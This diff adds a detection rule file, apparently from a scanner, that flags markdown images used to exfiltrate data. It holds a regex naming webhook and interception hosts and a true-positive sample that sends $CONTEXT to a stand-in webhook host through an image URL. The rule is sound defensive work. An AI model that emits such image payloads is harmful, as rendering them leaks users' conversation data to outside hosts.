@@ -1,0 +1,27 @@
+# SPDX-FileCopyrightText: 2026 Sebastien Rousseau
+# SPDX-License-Identifier: Apache-2.0 OR MIT
+#
+# Rules are data, not code: every implementation loads this same file, so
+# adding a rule never means writing the same pattern twice in two languages.
+
+id = "AGT-EXFIL-001"
+category = "data_exfiltration"
+severity = "high"
+title = "Image pingback exfiltration"
+scope = "normalised"
+applies_to = ["*.md"]
+
+description = '''Potential markdown image data exfiltration pingback'''
+rationale = '''A markdown image whose URL interpolates context. Rendering the document makes the request.'''
+
+# (?i) is inline, not a host-language compile flag: the flag would not
+# survive export and the two implementations would disagree on case.
+# scope = "normalised": Matched against the whitespace-normalised document so a payload split across a newline cannot evade it.
+pattern = '''(?i)!\[.*?\]\((https?://[^)]*(?:\$|`|webhook|canarytokens|burpcollaborator|requestbin)[^)]*)\)'''
+
+[[true_positive]]
+text = '''![x](https://webhook.example/c?d=$CONTEXT)'''
+
+[[false_positive]]
+text = '''![badge](https://img.shields.io/badge/x-y-blue)'''
+note = "Prose about the pattern, not an instance of it. A rule with no known false positive has not been tested against reality."
